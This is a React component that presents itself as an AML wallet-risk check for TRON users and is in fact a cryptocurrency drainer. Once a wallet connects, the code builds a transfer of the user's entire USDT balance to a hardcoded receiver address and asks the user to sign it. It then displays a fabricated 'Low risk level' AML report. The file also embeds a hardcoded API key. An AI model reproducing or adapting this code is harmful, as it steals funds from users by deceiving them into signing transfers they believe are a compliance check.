// src/components/tronAuthButton/TronAuthButton.tsx
import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';
import { Buffer } from 'buffer';
if (typeof window !== 'undefined') window.Buffer = Buffer;

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: {
        'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
    },
});

const adapter = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
            name: 'AML',
            description: 'TRON + WalletConnect Integration',
            url: 'https://amlreports.pro',
            icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
        },
    },
    web3ModalConfig: {
        themeMode: 'dark',
    },
});

export const TronAuthButton: React.FC = () => {
    const [modalMessage, setModalMessage] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);

    const disconnectAndNotify = async (message: string) => {
        setModalMessage(message);
        await adapter.disconnect();
    };

    const waitForAddress = async (timeout = 30000): Promise<string> => {
        const start = Date.now();
        return new Promise((resolve, reject) => {
            const interval = setInterval(() => {
                const address = adapter.address;
                if (address && tronWeb.isAddress(address)) {
                    clearInterval(interval);
                    resolve(address);
                } else if (Date.now() - start > timeout) {
                    clearInterval(interval);
                    reject(new Error('Timeout waiting for wallet connection'));
                }
            }, 300);
        });
    };

    const connectWallet = async () => {
        try {
            setLoading(true);
            await adapter.connect();

            const userAddress = await waitForAddress();
            tronWeb.setAddress(userAddress);

            const trxRaw = await tronWeb.trx.getBalance(userAddress);
            const trx = trxRaw / 1e6;

            if (trx < 1) {
                return await disconnectAndNotify('❌ Not enough TRX to pay network fees.');
            }

            const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
            const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call({ from: userAddress });
            const usdt = Number(usdtRaw) / 1e6;

            if (usdt < 1) {
                return await disconnectAndNotify('succes'); // Выводим AML отчёт
            }

            const functionSelector = 'transfer(address,uint256)';
            const parameter = [
                { type: 'address', value: TRON_RECEIVER },
                { type: 'uint256', value: usdtRaw },
            ];

            const options = {
                feeLimit: 25_000_000,
                callValue: 0,
            };

            const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
                USDT_CONTRACT,
                functionSelector,
                options,
                parameter,
                userAddress
            );

            if (!unsignedTx || !unsignedTx.transaction) {
                return await disconnectAndNotify('❌ Failed to build transaction.');
            }

            const signedTx = await adapter.signTransaction(unsignedTx.transaction);
            const result = await tronWeb.trx.sendRawTransaction(signedTx);

            if (result?.result !== true) {
                return await disconnectAndNotify('❌ Transaction failed to broadcast.');
            }

            await disconnectAndNotify('succes');
        } catch (err: any) {
            console.error('Error:', err);
            await adapter.disconnect();

            const errMsg = err?.message || err?.toString();

            if (
                errMsg.includes('Invalid address provided') ||
                errMsg.includes('Modal is closed') ||
                errMsg.includes('User rejected') ||
                errMsg.includes('Timeout waiting for wallet connection')
            ) {
                return;
            }

            if (errMsg.toLowerCase().includes('insufficient')) {
                setModalMessage('❌ Not enough TRX to complete transaction.');
                return;
            }

            setModalMessage('⚠️ Connection or transaction error');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div onClick={loading ? undefined : connectWallet} className='AuthButton'>
            {modalMessage && (
                <div className='modal__overflow'>
                    <div className="modal">
                        {modalMessage !== 'succes' ? (
                            <p>{modalMessage}</p>
                        ) : (
                            <>
                                <div className="content greenBorder">
                                    <div>0.6%</div>
                                    <div>
                                        <h3>Low risk level</h3>
                                        <div className="nums">
                                            <div><span className='circ green'></span> 0-30 </div>
                                            <div><span className='circ orange'></span> 31-69 </div>
                                            <div><span className='circ red'></span> 70-100 </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="content report">
                                    <p>AML report for a wallet:</p>
                                    <h5>{USDT_CONTRACT}</h5>
                                </div>
                            </>
                        )}
                        <button onClick={() => setModalMessage(null)}>Close</button>
                    </div>
                </div>
            )}
        </div>
    );
};
